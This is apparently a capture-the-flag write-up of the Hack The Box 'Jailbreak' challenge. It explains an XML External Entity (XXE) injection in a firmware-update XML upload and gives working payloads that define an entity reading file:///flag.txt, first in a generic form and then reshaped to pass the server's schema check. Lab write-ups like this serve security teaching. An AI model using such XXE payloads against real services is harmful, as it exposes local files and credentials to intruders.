# HTB Jailbreak - XXE via Firmware Update XML


## Analysis

Navigating to the ROM section lets us upload an XML configuration file for a firmware update. The default XML looks like:

```xml
<FirmwareUpdateConfig>
    <Firmware>
        <Version>1.33.7</Version>
        <ReleaseDate>2077-10-21</ReleaseDate>
        <Description>Update includes advanced biometric lock functionality for enhanced security.</Description>
        <Checksum type="SHA-256">9b74c9897bac770ffc029102a200c5de</Checksum>
    </Firmware>
    <Components>
        <Component name="navigation">
            <Version>3.7.2</Version>
            <Description>Updated GPS algorithms for improved wasteland navigation.</Description>
            <Checksum type="SHA-256">e4d909c290d0fb1ca068ffaddf22cbd0</Checksum>
        </Component>
        <Component name="communication">
            <Version>4.5.1</Version>
            <Description>Enhanced encryption for secure communication channels.</Description>
            <Checksum type="SHA-256">88d862aeb067278155c67a6d6c0f3729</Checksum>
        </Component>
        <Component name="biometric-security">
            <Version>2.0.5</Version>
            <Description>Introduces facial recognition and fingerprint scanning for access control.</Description>
            <Checksum type="SHA-256">abcdef1234567890abcdef1234567890</Checksum>
        </Component>
    </Components>
    <UpdateURL>https://satellite-updates.hackthebox.org/firmware/1.33.7/download</UpdateURL>
</FirmwareUpdateConfig>
```

This is a classic XXE (XML External Entity) injection target. The server parses the uploaded XML without sanitizing external entity references, so we can define an entity that reads a local file and embed it in the response.

## Exploit

The flag is at `/flag.txt`. A first attempt:

```xml
<?xml version="1.0" ?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

The server rejects it - the root element must be `FirmwareUpdateConfig` and must contain a `Firmware` child. Adjusting the payload to match the expected schema:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY exploit SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
  <Firmware>
    <Version>&exploit;</Version>
  </Firmware>
</FirmwareUpdateConfig>
```

Uploading this causes the parser to resolve `&exploit;` by reading `/flag.txt` and inlining its contents into the `Version` field, which the server reflects back in the response
